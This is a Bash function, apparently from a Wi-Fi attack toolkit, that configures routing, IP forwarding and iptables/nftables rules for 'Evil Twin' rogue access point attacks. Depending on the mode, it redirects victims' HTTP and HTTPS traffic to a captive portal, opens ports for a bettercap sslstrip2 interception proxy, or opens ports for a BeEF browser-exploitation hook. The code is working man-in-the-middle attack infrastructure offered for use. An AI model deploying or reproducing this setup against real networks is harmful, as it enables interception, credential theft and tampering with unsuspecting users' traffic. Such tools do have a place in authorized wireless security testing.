#Set routing state and firewall rules for Evil Twin attacks
function set_std_internet_routing_rules() {

	debug_print

	if [ "${routing_modified}" -eq 0 ]; then
		original_routing_state=$(cat /proc/sys/net/ipv4/ip_forward)
		save_iptables_nftables
	fi

	ip addr add ${et_ip_router}/${std_c_mask} dev "${interface}" > /dev/null 2>&1
	ip route add ${et_ip_range}/${std_c_mask_cidr} dev "${interface}" table local proto static scope link > /dev/null 2>&1
	routing_modified=1

	clean_initialize_iptables_nftables

	if [ "${et_mode}" != "et_captive_portal" ]; then
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip filter FORWARD counter accept
		else
			"${iptables_cmd}" -P FORWARD ACCEPT
		fi
		echo "1" > /proc/sys/net/ipv4/ip_forward 2> /dev/null
	else
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip filter FORWARD counter drop
		else
			"${iptables_cmd}" -P FORWARD DROP
		fi
		echo "0" > /proc/sys/net/ipv4/ip_forward 2> /dev/null
	fi

	if [ "${et_mode}" = "et_captive_portal" ]; then
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip nat PREROUTING tcp dport ${www_port} counter dnat to ${et_ip_router}:${www_port}
			"${iptables_cmd}" add rule ip nat PREROUTING tcp dport ${https_port} counter dnat to ${et_ip_router}:${www_port}
			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${www_port} counter accept
			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${https_port} counter accept
		else
			"${iptables_cmd}" -t nat -A PREROUTING -p tcp --dport ${www_port} -j DNAT --to-destination ${et_ip_router}:${www_port}
			"${iptables_cmd}" -t nat -A PREROUTING -p tcp --dport ${https_port} -j DNAT --to-destination ${et_ip_router}:${www_port}
			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${www_port} -j ACCEPT
			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${https_port} -j ACCEPT
		fi

		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip filter INPUT udp dport ${dns_port} counter accept
		else
			"${iptables_cmd}" -A INPUT -p udp --destination-port ${dns_port} -j ACCEPT
		fi
	elif [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${bettercap_proxy_port} counter accept
			"${iptables_cmd}" add rule ip filter INPUT udp dport ${bettercap_dns_port} counter accept
			"${iptables_cmd}" add rule ip filter INPUT iifname "lo" counter accept
		else
			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${bettercap_proxy_port} -j ACCEPT
			"${iptables_cmd}" -A INPUT -p udp --destination-port ${bettercap_dns_port} -j ACCEPT
			"${iptables_cmd}" -A INPUT -i lo -j ACCEPT
		fi
	elif [ "${et_mode}" = "et_sniffing_sslstrip2_beef" ]; then
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${bettercap_proxy_port} counter accept
			"${iptables_cmd}" add rule ip filter INPUT udp dport ${bettercap_dns_port} counter accept
			"${iptables_cmd}" add rule ip filter INPUT iifname "lo" counter accept
			"${iptables_cmd}" add rule ip filter INPUT tcp dport ${beef_port} counter accept
		else
			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${bettercap_proxy_port} -j ACCEPT
			"${iptables_cmd}" -A INPUT -p udp --destination-port ${bettercap_dns_port} -j ACCEPT
			"${iptables_cmd}" -A INPUT -i lo -j ACCEPT
			"${iptables_cmd}" -A INPUT -p tcp --destination-port ${beef_port} -j ACCEPT
		fi
	fi

	if [ "${et_mode}" != "et_captive_portal" ]; then
		if [ "${iptables_nftables}" -eq 1 ]; then
			"${iptables_cmd}" add rule nat POSTROUTING ip saddr ${et_ip_range}/${std_c_mask_cidr} oifname "${internet_interface}" counter masquerade
		else
			"${iptables_cmd}" -t nat -A POSTROUTING -o "${internet_interface}" -j MASQUERADE
		fi
	fi

	if [ "${iptables_nftables}" -eq 1 ]; then
		"${iptables_cmd}" add rule ip filter INPUT ip saddr ${et_ip_range}/${std_c_mask_cidr} ip daddr ${et_ip_router}/${ip_mask_cidr} icmp type echo-request ct state new,related,established counter accept
		"${iptables_cmd}" add rule ip filter INPUT ip saddr ${et_ip_range}/${std_c_mask_cidr} ip daddr ${et_ip_router}/${ip_mask_cidr} counter drop
	else
		"${iptables_cmd}" -A INPUT -p icmp --icmp-type 8 -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
		"${iptables_cmd}" -A INPUT -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -j DROP
	fi
	sleep 2
}
